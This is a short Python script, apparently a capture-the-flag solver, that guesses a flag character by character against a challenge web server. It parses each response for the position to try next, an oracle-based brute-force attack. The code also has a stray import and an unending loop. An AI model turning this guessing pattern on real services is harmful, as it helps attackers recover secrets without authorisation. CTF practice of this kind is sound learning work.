# make a post request to the url and get the html
from re import A
import requests
import sys

# variables
charset= ' abcdefghijklmnopqrstuvwxyz0123456789_'
a=5
b=6
var_ctf= 'CTFR{..............................}'
url = 'https://web.ctf.rasyidmf.com/chal16/'
# post the data
while True:
    for i in charset:
        # GET request from POST request
        r = requests.get(url+'?flag='+var_ctf[:a]+i+var_ctf[b:])
        # append to var_ctf
        var_ctf= var_ctf[:a]+i+var_ctf[b:]
        print(var_ctf)
        # a = 4th word of r.text
        a=r.text.split(' ')[3]
        a=a.replace('<b>','')
        a=int(a.replace('</b>',''))
        print(a)
        b=a+1

